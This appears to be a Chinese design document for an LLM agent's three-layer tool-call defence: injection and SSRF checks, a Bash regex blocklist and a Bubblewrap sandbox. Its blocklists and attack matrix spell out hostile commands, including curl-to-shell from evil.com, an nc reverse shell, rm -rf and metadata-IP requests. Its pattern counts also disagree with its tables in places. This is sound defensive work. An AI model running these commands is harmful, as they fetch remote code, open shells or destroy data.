# 工具调用三层防御纵深

## 概述

mybot 的工具调用经过三道独立的安全防线，从语义策略到进程隔离逐层收窄攻击面：

```
User / LLM 请求
      │
      ▼
┌─────────────────────────────────────────────────────┐
│  L1: ToolGuard — 基于能力的安全策略（能力 → 检查）    │
│  tools/guard.py:224  pre_check()                    │
│  · SHELL → 命令注入检测（9 类注入模式）               │
│  · NETWORK → SSRF 防护（内网 IP / 元数据端点拦截）     │
│  · FILE_R/W → 敏感路径拦截（密钥、凭证、.git）        │
└─────────────────────────────────────────────────────┘
      │ 通过
      ▼
┌─────────────────────────────────────────────────────┐
│  L2: Regex 拦截列表 — 命令字符串模式匹配              │
│  tools/bash_tool.py:102  _contains_dangerous_pattern() │
│  · 12 个危险正则模式（rm -rf /、sudo、curl|sh 等）   │
│  · 4 个禁止子串（__import__、eval、exec、compile）    │
└─────────────────────────────────────────────────────┘
      │ 通过
      ▼
┌─────────────────────────────────────────────────────┐
│  L3: OS 沙箱 — 命名空间隔离 + 能力裁剪               │
│  tools/sandbox/  SandboxBackend.execute()           │
│  · NoSandbox — 裸 subprocess（无隔离）               │
│  · BubblewrapSandbox — bwrap 容器隔离                │
│    · PID/IPC/UTS/cgroup 命名空间隔离                  │
│    · 所有 capabilities 裁剪 (--cap-drop ALL)         │
│    · 文件系统只读，仅 workspace 可写                   │
│    · 私有 /tmp (tmpfs)                               │
│    · 环境变量清零后逐变量注入                           │
└─────────────────────────────────────────────────────┘
```

## 架构设计原则

三层防线各有不同职责，互不重叠：

| 层级 | 粒度 | 失败模式 | 绕过难度 |
|------|------|----------|----------|
| L1 ToolGuard | 工具级（所有工具） | 拒绝执行 + 日志告警 | 需伪造合法参数 |
| L2 Regex | 命令字符串（仅 BashTool） | 拒绝执行 + 提示被拦截 | 需构造绕过正则的 payload |
| L3 OS 沙箱 | 进程级（仅 BashTool） | 进程隔离，越权操作无效果 | 需逃逸 Linux 命名空间 |

**关键设计约束**：三层均无外部 I/O 依赖，均为同步/异步函数调用，不引入网络延迟。L3 仅在工具内部生效，对调用方完全透明。

---

## 完整调用链

以下从 AgentCore 收到 LLM 的 tool_call 请求开始，追踪到操作系统进程创建的完整路径。

### 入口：AgentCore 执行工具调用

```python
# core/runner.py:989
async def _execute_tool_calls(self, tool_calls, spec, ...):
    for idx, tc in enumerate(tool_calls):
        # 调用 ToolRegistry.execute()
        result = await tools.execute(tc.name, tc.arguments)
```

`AgentCore._execute_tool_calls()` 是 Agent 循环中处理 LLM 工具调用的统一入口。每次 LLM 返回 `tool_calls`，AgentCore 遍历调用列表，通过 `ToolRegistry.execute()` 分发。

### 步骤 1：ToolRegistry.execute()

```python
# tools/registry.py:55
async def execute(self, name: str, arguments: dict) -> ToolResult:
    tool = self._tools.get(name)
    if tool is None:
        return ToolResult(success=False, error=f"Unknown tool: {name}")

    # ── L1 防线入口 ──
    if self.guard is not None:
        allowed, reason = self.guard.pre_check(
            tool.name, tool.capabilities, arguments,
        )
        if not allowed:
            return ToolResult(success=False, error=reason)

    # ── 调用工具自身的 execute() ──
    return await tool.execute(**arguments)
```

ToolRegistry 在调用工具前注入 L1 检查。`guard` 为 None 时跳过（如内存处理场景），正常情况下 Orchestrator 会为所有 scope 注入 ToolGuard。

---

## L1: ToolGuard — 基于能力的安全策略

**文件**：`tools/guard.py`

### 能力模型

每个工具在类定义时声明 `capabilities`（`set[Capability]`）：

```python
# tools/bash_tool.py:130
class BashTool(Tool):
    capabilities = {
        Capability.SHELL,      # → 触发命令注入检测
        Capability.NETWORK,    # → 触发 SSRF 检测
        Capability.FILE_READ,  # → 触发敏感路径检测
        Capability.FILE_WRITE, # → 触发敏感路径检测
    }
```

声明为空集（默认）的工具视为纯计算，跳过所有安全检查。

### pre_check() 主入口

```python
# tools/guard.py:224
def pre_check(self, tool_name: str, capabilities: set[Capability],
              arguments: dict[str, Any]) -> tuple[bool, str]:
    """返回 (allowed, reason)。reason 为空字符串时表示通过。"""
```

检查逻辑按能力分派，每个检查独立执行，任一失败即阻止：

#### SHELL → 命令注入检测

```python
# tools/guard.py:264
def _check_command_injection(self, arguments) -> str | None:
    command = arguments.get("command", "")
    # 1. 先剥离带引号的 heredoc 体（避免 Markdown 反引号误报）
    command = _strip_quoted_heredocs(command)
    # 2. 逐一匹配 9 种注入模式
    for pattern in _EXTRA_INJECTION_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return f"injection pattern detected: {pattern}"
    return None
```

检测的 9 类注入模式（`tools/guard.py:118-128`）：

| 模式 | 正则 | 拦截意图 |
|------|------|----------|
| `$()` 命令替换 | `\$\(.*\)` | 内联命令执行 |
| 反引号命令替换 | `` `[^`]+` `` | 传统命令替换语法 |
| `${}` 变量展开 | `\$\{[^}]+\}` | 动态变量注入 |
| /dev/tcp 伪设备 | `/dev/(tcp\|udp)/` | bash 内置反向 shell |
| `echo -e '\xHH'` | `\becho\b.*\\x[0-9a-fA-F]{2}` | 十六进制编码绕过 |
| `$'\xHH'` | `\$'\\x[0-9a-fA-F]{2}` | ANSI-C 引用编码绕过 |
| socat | `\bsocat\b` | 多功能网络隧道工具 |
| nc 反向 shell | `\bnc\b.*-[lL].*-[eE]` / `.*-[lL].*-[cC]` | netcat 监听/连接模式 |

#### NETWORK → SSRF 防护

```python
# tools/guard.py:280
def _check_ssrf(self, arguments) -> str | None:
    for value in arguments.values():
        for url in _extract_urls(value):
            host = _host_from_url(url)
            # 1. 主机名黑名单
            if host in _SSRF_BLOCKED_HOSTS:  # localhost, 169.254.169.254, metadata.google.internal...
                return f"SSRF blocked: host {host!r}"
            # 2. IP 范围检测（10/8, 172.16/12, 192.168/16, 127/8, 169.254/16...）
            if _is_private_ip(host):
                return f"SSRF blocked: private IP {host!r}"
    return None
```

SSRF 拦截分两步：

1. **主机名黑名单**（`tools/guard.py:60-67`）：`localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`, `metadata.google.internal`, `169.254.169.254`
2. **IP 范围检测**（`tools/guard.py:69-80`）：10 段、172.16 段、192.168 段、169.254 段、127 段、0 段、组播 224 段、IPv6 loopback/link-local/unique-local

URL 提取后通过 Python `ipaddress` 模块进行精确的 CIDR 匹配，不依赖正则。

#### FILE_READ / FILE_WRITE → 敏感路径检测

```python
# tools/guard.py:299
def _check_sensitive_path(self, path: str) -> str | None:
    return _match_blocked_path(path)
```

拦截两类目标（`tools/guard.py:41-58`）：

**文件扩展名黑名单**：`.env`, `.pem`, `.key`, `.p12`, `.pfx`, `.jks`, `.keystore`

**路径模式匹配**：
- `.git/` 目录
- `.ssh/` 目录
- 路径中含 `credentials`/`secret`/`password`/`token` 关键字的文件
- `.env` 及其变体（`.env.local`, `.env.production`, `.env.staging`, `.env.development`, `.env.prod`, `.env.dev`）

### L1 失败行为

```python
# tools/guard.py:236
logger.warning("ToolGuard: shell injection blocked for '%s': %s",
               tool_name, err)
return False, err  # 拒绝执行 + 结构化日志
```

L1 拦截时返回 `ToolResult(success=False, error=reason)`，LLM 会收到错误消息并可选择修正命令后重试。

---

## L2: Regex 拦截列表 — 命令字符串模式匹配

**文件**：`tools/bash_tool.py`

L2 防线是 BashTool 的内部检查，在命令传递给沙箱之前执行。

### _contains_dangerous_pattern()

```python
# tools/bash_tool.py:102
def _contains_dangerous_pattern(command: str) -> str | None:
    cmd = command.strip()
    # 第一步：12 个危险正则模式
    for pattern in _DANGEROUS_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return pattern
    # 第二步：4 个禁止子串
    for sub in _BLOCKED_SUBSTRINGS:
        if sub in cmd:
            return sub
    return None
```

### 12 个危险正则模式（`tools/bash_tool.py:36-58`）

| # | 模式 | 拦截意图 |
|---|------|----------|
| 1 | `rm -rf /` 及其变体 | 递归删除根目录 |
| 2 | `mkfs.` | 格式化文件系统 |
| 3 | `dd ... of=/dev/sd*` | 直接写入块设备 |
| 4 | `> /dev/sd*` | shell 重定向到块设备 |
| 5 | `:(){ :\|:& };:` | fork 炸弹 |
| 6 | `shutdown`/`reboot`/`halt`/`poweroff` | 系统关机 |
| 7 | `systemctl halt/poweroff/reboot/...` | systemd 关机命令 |
| 8 | `sudo` | 提权操作 |
| 9 | `curl\|bash` / `wget\|python` | 网络下载直管道解释器 |
| 10 | `> /etc/passwd` 写入 | 覆写认证文件 |
| 11 | `chmod 4777 /` | 设置 SUID 位于系统目录 |
| 12 | `chmod 777 /` | 放宽系统目录权限 |
| 13 | `chown user:group /` | 变更系统目录所有者 |

### 4 个禁止子串（`tools/bash_tool.py:62-67`）

```python
_BLOCKED_SUBSTRINGS = ["__import__(", "eval(", "exec(", "compile("]
```

这些 Python 内置函数在所有出现位置被拦截，防止通过 `python -c` 执行任意代码。

### L1 和 L2 的关系

L1（ToolGuard）和 L2（BashTool 内部）是**互补**的，不是重复：

- **L1** 检测通用的 shell 注入技术（`$()`、反引号、`/dev/tcp`、socat、nc），适用于任何带 SHELL 能力的工具
- **L2** 检测具体的危险操作（`rm -rf /`、`sudo`、`curl|sh`），是 BashTool 特有的语义层级检查

一条命令可能被 L1 拦截而通过 L2（如 `$(whoami)`），也可能通过 L1 而被 L2 拦截（如 `sudo ls`）。

### L2 失败行为

```python
# tools/bash_tool.py:182
return ToolResult(
    success=False,
    content="",
    error=f"dangerous pattern blocked: {blocked}",
)
```

被拦截的命令不会进入沙箱，不会创建子进程。

---

## L3: OS 沙箱 — 进程级命名空间隔离

**文件**：`tools/sandbox/`

L3 是最后一道防线。即使攻击者成功绕过了 L1 和 L2，OS 级隔离也能限制其破坏范围。

### SandboxBackend 接口

```python
# tools/sandbox/base.py:29
class SandboxBackend(ABC):
    @abstractmethod
    async def execute(
        self, command: str, *,
        cwd: str, env: dict[str, str], timeout: int,
    ) -> SandboxResult: ...
```

两个实现：

### NoSandbox（默认）

```python
# tools/sandbox/none.py
class NoSandbox(SandboxBackend):
    async def execute(self, command, *, cwd, env, timeout):
        proc = await asyncio.create_subprocess_exec(
            "bash", "-c", command,
            stdout=PIPE, stderr=PIPE, cwd=cwd, env=env,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )
        return SandboxResult(stdout=..., stderr=..., exit_code=...)
```

无隔离，与原始 BashTool 行为一致。适用于开发环境和信任的执行上下文。

### BubblewrapSandbox

```python
# tools/sandbox/bubblewrap.py
class BubblewrapSandbox(SandboxBackend):
    def _build_bwrap_args(self, command, *, cwd, env):
        args = [
            "--unshare-all",      # 隔离所有命名空间
            "--share-net",        # 保留网络访问（NETWORK 能力）
            "--cap-drop", "ALL",  # 裁剪所有 capabilities
            "--proc", "/proc",    # 挂载 proc
            "--dev", "/dev",      # 挂载 dev
            "--tmpfs", "/tmp",    # 私有临时文件系统
        ]
        # 只读系统绑定
        for path in ("/usr", "/bin", "/lib", "/lib64", "/etc"):
            if Path(path).exists():
                args += ["--ro-bind", path, path]
        # 读写 workspace 绑定
        args += ["--bind", str(self._workspace), str(self._workspace)]
        # 环境变量清零 + 白名单注入
        args.append("--clearenv")
        for key, value in sorted(env.items()):
            args += ["--setenv", key, value]
        # 父进程退出时自动清理
        args += ["--die-with-parent"]
        # 设置工作目录
        args += ["--chdir", cwd]
        # 实际命令
        args += ["bash", "-c", command]
        return args
```

Bubblewrap 创建的隔离容器具有以下安全属性：

| 属性 | 配置 | 效果 |
|------|------|------|
| PID 命名空间 | `--unshare-all` | 容器内进程对宿主机进程不可见 |
| IPC 命名空间 | `--unshare-all` | 无法访问宿主机共享内存/消息队列 |
| UTS 命名空间 | `--unshare-all` | 独立主机名 |
| cgroup 命名空间 | `--unshare-all` | 独立 cgroup 视图 |
| Capabilities | `--cap-drop ALL` | 即使 root 也无可用的 capabilities |
| 文件系统 | `--ro-bind` 系统路径 | `/usr`, `/bin`, `/lib`, `/etc` 只读 |
| 工作目录 | `--bind workspace` | 仅 workspace 可读写 |
| /tmp | `--tmpfs /tmp` | 私有 tmpfs，会话结束后自动销毁 |
| 环境变量 | `--clearenv` + `--setenv` | 仅传递白名单变量 |
| 网络 | `--share-net` | 保留网络（curl、git clone 等正常使用） |
| 生命周期 | `--die-with-parent` | 父进程退出时容器自动清理，无孤儿进程 |

### 环境变量白名单

即使 L1 和 L2 被绕过，通过 `_build_sandbox_env()`（`tools/bash_tool.py:83-99`），环境变量也被严格限制：

```python
_ALLOWED_ENV_KEYS = frozenset({
    "PATH", "HOME", "USER", "LOGNAME", "LANG", "LC_ALL", "LC_CTYPE",
    "TERM", "SHELL", "PWD", "OLDPWD", "TMPDIR", "TMP", "TEMP",
    "VIRTUAL_ENV", "CONDA_PREFIX", "PYTHONPATH", "LD_LIBRARY_PATH",
})
```

PATH 被强制重设为可信路径：`/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin`

### 配置方式

```bash
# 默认（无隔离）
mybot

# Bubblewrap 容器隔离
MYBOT_SANDBOX_BACKEND=bubblewrap mybot

# 前置条件
which bwrap  # 需安装 bubblewrap
```

---

## 攻击场景矩阵

以下列举常见攻击向量及三层防线各自的拦截能力：

| 攻击向量 | L1 ToolGuard | L2 Regex | L3 Bubblewrap | 最终结果 |
|----------|-------------|----------|---------------|----------|
| `$(curl evil.com\|sh)` | ✅ `$()` 模式拦截 | — | ✅ `curl` 结果即使执行也被隔离 | L1 拦截 |
| `` `cat /etc/passwd` `` | ✅ 反引号模式拦截 | — | ✅ /etc 只读，内容也出不去 | L1 拦截 |
| `sudo rm -rf /` | — | ✅ `sudo` 拦截 | ✅ 无 capabilities，`sudo` 本身无效 | L2 拦截 |
| `rm -rf ~/Documents` | — | ✅ `rm -rf ~` 模式拦截 | ✅ ~ 只读 | L2 拦截 |
| `curl http://169.254.169.254/` | ✅ SSRF 元数据 IP 拦截 | — | ✅ 即使发出请求，仅拿到容器内数据 | L1 拦截 |
| `cat .env` | ✅ 敏感扩展名拦截 | — | ✅ workspace 内 `.env` 仍可读 | L1 拦截 |
| `python -c "print(eval('1+1'))"` | — | ✅ `eval(` 子串拦截 | — | L2 拦截 |
| `curl evil.com/backdoor \| bash` | ✅ `$()` 不匹配但 | ✅ `curl\|bash` 拦截 | ✅ 即使执行也被容器限制 | L2 拦截 |
| `nc -l -p 4444 -e /bin/bash` | ✅ `nc -l ... -e` 拦截 | — | ✅ 即使绑定，仅容器内可见 | L1 拦截 |
| `chmod 777 /usr/bin` | — | ✅ `chmod 777 /` 拦截 | ✅ `/usr` 只读挂载，chmod 无效 | L2 + L3 双拦截 |
| 零日漏洞 / 未知攻击 | ❓ 可能漏过 | ❓ 可能漏过 | ✅ 命名空间隔离兜底 | L3 兜底 |

---

## 防御层次关系图

```
LLM 生成的 tool_call
        │
        ▼
AgentCore._execute_tool_calls()
        │
        ▼
ToolRegistry.execute(name, arguments)
        │
        ├─► L1: ToolGuard.pre_check(name, capabilities, arguments)
        │      │
        │      ├─ SHELL → _check_command_injection()
        │      │   ├─ _strip_quoted_heredocs()  ← 去误报
        │      │   └─ 8 个注入正则逐一匹配
        │      │
        │      ├─ NETWORK → _check_ssrf()
        │      │   ├─ _extract_urls() → 提取 HTTP(S) URL
        │      │   ├─ _host_from_url() → 解析主机名
        │      │   ├─ _SSRF_BLOCKED_HOSTS → 主机名黑名单
        │      │   └─ _is_private_ip() → 10 个 CIDR 匹配
        │      │
        │      └─ FILE_R/W → _check_sensitive_path()
        │          └─ _match_blocked_path()
        │              ├─ 6 个扩展名黑名单
        │              └─ 10 个路径正则
        │
        ▼ [L1 通过]
tool.execute(**arguments)
        │
        ▼ [BashTool 时]
BashTool.execute(command)
        │
        ├─ 长度检查 (MAX_COMMAND_LENGTH = 4096)
        │
        ├─► L2: _contains_dangerous_pattern(command)
        │      ├─ 12 个危险正则模式
        │      └─ 4 个禁止子串
        │
        ▼ [L2 通过]
SandboxBackend.execute(command, cwd=..., env=..., timeout=...)
        │
        ├── NoSandbox
        │   └─ asyncio.create_subprocess_exec("bash", "-c", command, ...)
        │
        └── BubblewrapSandbox
            └─► L3: asyncio.create_subprocess_exec("bwrap",
                    --unshare-all, --share-net,
                    --cap-drop ALL,
                    --proc /proc, --dev /dev, --tmpfs /tmp,
                    --ro-bind /usr /usr, --ro-bind /bin /bin, ...,
                    --bind <workspace> <workspace>,
                    --clearenv, --setenv PATH=..., ...,
                    --die-with-parent, --chdir <cwd>,
                    bash, -c, <command>)
```

---

## 新增沙箱后端

要添加新的沙箱后端（如 DockerSandbox）：

1. 在 `tools/sandbox/` 中创建新文件，继承 `SandboxBackend`
2. 实现 `name` 属性和 `execute()` 方法
3. 在 `tools/sandbox/__init__.py` 的 `create_sandbox()` 中添加分支
4. 设置 `MYBOT_SANDBOX_BACKEND=docker` 即可切换

后端对 BashTool 完全透明，无需修改 `bash_tool.py`。

---

## 相关文件索引

| 文件 | 职责 |
|------|------|
| `core/runner.py:989-1142` | AgentCore._execute_tool_calls() — 工具调用入口 |
| `tools/registry.py:55-78` | ToolRegistry.execute() — L1 注入点 |
| `tools/guard.py:224-260` | ToolGuard.pre_check() — L1 校验逻辑 |
| `tools/guard.py:264-278` | _check_command_injection() — 命令注入检测 |
| `tools/guard.py:280-297` | _check_ssrf() — SSRF 检测 |
| `tools/guard.py:299-303` | _check_sensitive_path() — 路径安全检测 |
| `tools/bash_tool.py:102-111` | _contains_dangerous_pattern() — L2 校验逻辑 |
| `tools/bash_tool.py:36-58` | _DANGEROUS_PATTERNS — L2 正则模式定义 |
| `tools/bash_tool.py:62-67` | _BLOCKED_SUBSTRINGS — L2 子串黑名单 |
| `tools/bash_tool.py:83-99` | _build_sandbox_env() — 环境变量白名单 |
| `tools/sandbox/base.py` | SandboxBackend ABC + SandboxResult |
| `tools/sandbox/none.py` | NoSandbox — 无隔离后端 |
| `tools/sandbox/bubblewrap.py` | BubblewrapSandbox — bwrap 容器隔离 |
| `tools/sandbox/__init__.py` | create_sandbox() 工厂函数 |
